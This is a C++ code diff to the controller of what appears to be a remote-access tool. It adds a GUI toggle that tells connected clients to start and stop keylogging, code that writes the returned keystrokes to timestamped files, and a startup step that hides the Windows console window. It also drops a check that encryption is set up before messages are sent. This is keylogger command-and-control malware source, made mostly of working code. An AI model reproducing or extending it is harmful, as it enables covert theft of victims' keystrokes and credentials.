@@ -10,6 +10,7 @@
 #include "ThreadWrapper.hpp"
 #include "Message.hpp"
 #include "ImGuiScrollableText.hpp"
+#include "FunctionalityStruct.hpp"
 
 #define DEFAULT_BUFLEN 2048
 #define DEFAULT_PORT 62300
@@ -43,7 +44,26 @@ public:
         return name + "##" + getPeerIpPort() + '_' + postfix;
     }
 
+    FunctionalityStruct funcStruct;
+
 private:
+    void executeMessage(const Message& msg) {
+        switch(msg.commandNumber) {
+            case MessageDisableKeylog: {
+                std::string filename = "keylog_" + getCurrentIsoTime() + ".txt";
+                std::ofstream outfile(filename);
+                if(!outfile) {
+                    miniConsole.AddLineError("Keylogger data failed to save to file");
+                    break;
+                }
+                outfile.write(msg.getBinaryData(), msg.getBinaryDataSize());
+                outfile.close();
+                miniConsole.AddLineInfo("Keylogger data saved to file %s", filename.c_str());
+                break;
+            }
+        }
+    }
+
     void listenToClient() {
         while (active.load()) {
             auto status = receiveData();
@@ -53,6 +73,11 @@ private:
                     Message msg;
                     if (processCompleteMessage(msg)) {
                         miniConsole.AddLineSuccess("Successfully proceeded message %s", this->getPeerIpPort().c_str());
+                        std::thread([&msg, this]() {
+                            executeMessage(msg);
+                        }).detach();
+                    } else {
+                        miniConsole.AddLineError("Failed to proceeded message %s", this->getPeerIpPort().c_str());
                     }
                     break;
                 }
@@ -295,29 +320,22 @@ void RunGui() {
         if (ImGui::CollapsingHeader(headerLabel.c_str())) {
             ImGui::Text("Connected for %llus", client.getConnectionDuration());
             
-            static std::string sendBuffer;
-            ImGui::InputTextMultiline(client.makeWidgetName("Message Input").c_str(), &sendBuffer, ImVec2(-1, 60));
+            ImGui::InputTextMultiline(client.makeWidgetName("Message Input").c_str(), &client.funcStruct.rawText, ImVec2(-1, 60));
             
             // Send button
             if (ImGui::Button(client.makeWidgetName("Send Message").c_str())) {
-                if (sendBuffer.size() > 0) {
+                if (client.funcStruct.rawText.size() > 0) {
                     std::thread([&client] {
-                        if (client.isActive() && client.crypt.checkOtherPublicKeyStatus()) {
-                            Message textMessage;
-                            textMessage.commandNumber = MessageRawText;
-                            textMessage.setBinaryData(sendBuffer.c_str(), sendBuffer.size());
-                            
-                            if (client.sendData(textMessage)) {
-                                miniConsole.AddLineSuccess("Message sent to %s", 
-                                                         client.getPeerIpPort().c_str());
-                            } else {
-                                miniConsole.AddLineError("Failed to send message to %s", 
+                        Message textMessage;
+                        textMessage.commandNumber = MessageRawText;
+                        textMessage.setBinaryData(client.funcStruct.rawText.c_str(), client.funcStruct.rawText.size());
+                        
+                        if (client.sendData(textMessage)) {
+                            miniConsole.AddLineSuccess("Raw text Message sent to %s", 
                                                         client.getPeerIpPort().c_str());
-                            }
                         } else {
-                            miniConsole.AddLineWarning("Cannot send to %s - %s", 
-                                                      client.getPeerIpPort().c_str(),
-                                                      client.isActive() ? "encryption not established" : "client disconnected");
+                            miniConsole.AddLineError("Failed to send raw text message to %s", 
+                                                    client.getPeerIpPort().c_str());
                         }
                     }).detach();
                 }
@@ -332,6 +350,36 @@ void RunGui() {
                     miniConsole.AddLineWarning("Kicked client %s", client.getPeerIpPort().c_str());
                 }).detach();
                 clientVector.removeInactive();
+            }
+
+            if(ImGui::Checkbox("Func: Keylogger", &client.funcStruct.isKeyloggerActive)) {  //click -> already changed the state
+                if(client.funcStruct.isKeyloggerActive) {
+                    std::thread([&client] {
+                        Message msg;
+                        msg.commandNumber = MessageEnableKeylog;
+                        
+                        if (client.sendData(msg)) {
+                            miniConsole.AddLineSuccess("Enable Keylogger Message sent to %s", 
+                                                        client.getPeerIpPort().c_str());
+                        } else {
+                            miniConsole.AddLineError("Failed to send Enable Keylogger message to %s", 
+                                                    client.getPeerIpPort().c_str());
+                        }
+                    }).detach();
+                } else {
+                    std::thread([&client] {
+                        Message msg;
+                        msg.commandNumber = MessageDisableKeylog;
+                        
+                        if (client.sendData(msg)) {
+                            miniConsole.AddLineSuccess("Disable Keylogger Message sent to %s", 
+                                                        client.getPeerIpPort().c_str());
+                        } else {
+                            miniConsole.AddLineError("Failed to send Disable Keylogger message to %s", 
+                                                    client.getPeerIpPort().c_str());
+                        }
+                    }).detach();
+                }
             }
         }
         clientVector.removeInactive();
@@ -386,6 +434,11 @@ void RunSFMLBackend() {
 ServerConnectionManager connectionManager;
 
 int main(void) {
+    #ifdef WIN32
+    HWND hwnd = GetConsoleWindow();
+    ShowWindow(hwnd, SW_HIDE);
+    #endif
+
     WSADATA wsaData;
     // Initialize Winsock
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
